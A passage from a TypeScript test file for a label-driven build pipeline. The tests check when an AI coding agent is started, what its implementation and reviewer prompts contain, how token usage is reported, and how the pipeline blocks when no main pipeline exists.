    changes: { labels: { previous: [{ title: "factory_ready" }], current: [{ title: "factory_running" }] } } };
  const comment = { object_kind: "note", user: { id: BOT }, project, object_attributes: { noteable_type: "Issue", note: "/label ~factory_ready" }, issue: { iid: 8 } };
  for (const payload of [labelChange, comment]) {
    const w = await runBuildJobs(fakeWorld({ payload, liveLabels: ["factory_running"] }));
    expect(w.record.steps.map((s) => s.step)).toEqual(["event"]);
    expect(w.record.steps[0].data).toMatchObject({ start: false, reason: "not-added" });
    expect(w.jevAsked).toBe(0);
    expect(w.ran).toEqual([]);
    expect(w.claudeCalls).toBe(0);
    expect(w.labels).toEqual(["factory_running"]);
  }
});

test("the author is told to implement the ticket, tests first, until lint, test and build pass, without committing", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" } }));
  const p = w.claudeRuns[0].prompt;
  expect(p).toMatch(/implement the ticket/);
  expect(p).toMatch(/tests first, then the code/);
  expect(p).toMatch(/until lint, test and build pass/);
  expect(p).toMatch(/Do not commit/);
});

test("the result comment shows the tokens used and the author's summary", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" } }));
  expect(w.record).toMatchObject({ tokens: { input: 100, output: 20 }, summary: "1. Which list?" });
  await resultSaved.run(w.ctx);
  expect(w.workItemComments.at(-1)).toContain("Tokens: 100 in, 20 out");
  expect(w.workItemComments.at(-1)).toContain("What changed: 1. Which list?");
});

test("a webhook label start stops when factory_ready is no longer on the work item", async () => {
  const w = await runBuildPipeline(fakeWorld({ liveLabels: [] }));
  expect(w.record.steps.map((s) => s.step)).toEqual(["event"]);
  expect(w.record.steps[0].data).toMatchObject({ start: false, reason: "not-ready" });
  expect(w.labels).toEqual([]);
});
test("a canceled, skipped or missing main pipeline blocks with no main pipeline, and does not revert", async () => {
  for (const mainPipeline of ["none", "running"] as const) {
    const w = await runFinishPipeline(fakeWorld({ mainPipeline }));
    expect(w.revertOpened).toBe(false);
    expect(w.labels).toEqual(["factory_blocked"]);
    expect(w.workItemComments.at(-1)).toContain("no main pipeline");
  }
});
test("the reviewer prompt holds the ticket wrapped once", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" } }));
  const p = reviewerPrompt(ticketText(w.ctx), "diff");
  expect(p.match(/<\/ticket>/g)).toHaveLength(1); // the prompt text itself names `<ticket>`, never the closing tag
});
